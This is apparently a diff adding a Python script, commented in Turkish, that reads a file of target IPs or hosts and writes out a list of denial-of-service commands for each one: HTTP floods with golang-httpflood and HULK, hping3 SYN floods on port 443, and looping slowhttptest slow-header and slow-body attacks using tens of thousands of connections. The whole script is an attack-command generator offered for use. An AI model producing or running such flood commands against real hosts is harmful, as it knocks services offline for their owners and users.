@@ -1,0 +1,73 @@
+# dosyadan ipleri okuyacak
+# servisler ve httpsi ayiracagiz
+# saldirillara ekelyecek
+# saldirilari print edecek
+import pyfiglet
+def readService(fileLocation, isHTTPS):
+    list = []
+    f = open(fileLocation, 'r')
+    list = f.readlines()
+
+
+    f.close()
+
+    return list
+
+
+def addAttack(fileLocation, isHTTPS):
+    list = readService(fileLocation, isHTTPS)
+    print(list)
+    commandList = []
+    for i in list:
+        print(i)
+        commandList.append('-------------------------------------' + i + '-------------------------------------'+ "\n")
+
+
+        if isHTTPS:
+            addHTTPS = str("https://" + i + '/')
+            addHTTPS = addHTTPS.replace("\n","")
+            commandList.append(str('cd golang-httpflood/ && yes | go run httpflood.go "' + addHTTPS + '" 1000 get 6000 nil'+ "\n"))
+            commandList.append(str('python ./hulk/hulk.py "' + addHTTPS + '"' + "\n"))
+            commandList.append(str('hping3 --flood -S -p 443' + i+ "\n"))
+            commandList.append(str('while true; do slowhttptest -H -c 60000 -i 8640000 -l 8640000 -r 10000 -s 10240 -x 24 -t GET -u "' + addHTTPS+ '"; sleep 60; done;' + "\n"))
+            commandList.append(str('while true; do slowhttptest -B -c 60000 -i 8640000 -l 8640000 -r 10000 -s 10240 -x 24 -t POST -u "' + addHTTPS + '"; sleep 60; done;'+ "\n"))
+            print(commandList)
+        else:
+            commandList.append(str('hping3 --flood -S -p 443 ' + i))
+            print(list)
+    return commandList
+
+def crateFile(list,isHTTPS):
+    print(list)
+    if isHTTPS:
+        f = open("saldiriListesiHTTPS.txt", "w+")
+        for i in list:
+            f.write(i)
+    else:
+        f = open("SaldiriListesi", "w+")
+        for i in list:
+            f.write(i)
+
+def run():
+    getFileLocation = input("Dosya konumunu Giriniz")
+    getHTTPS = input("IPler HTTPS mi?")
+
+    list = addAttack(getFileLocation,getHTTPS)
+
+    crateFile(list,getHTTPS)
+
+
+
+
+if __name__ == '__main__':
+    print("""
+  ___  _       _____  __  ___       
+ ( _ )/ |_   _|___ / / _|/ _ \__  __
+ / _ \| | | | | |_ \| |_| | | \ \/ /
+| (_) | | |_| |___) |  _| |_| |>  < 
+ \___/|_|\__,_|____/|_|  \___//_/\_\
+                                    
+                                                                       
+""")
+    run()
+    print("BASARILI")
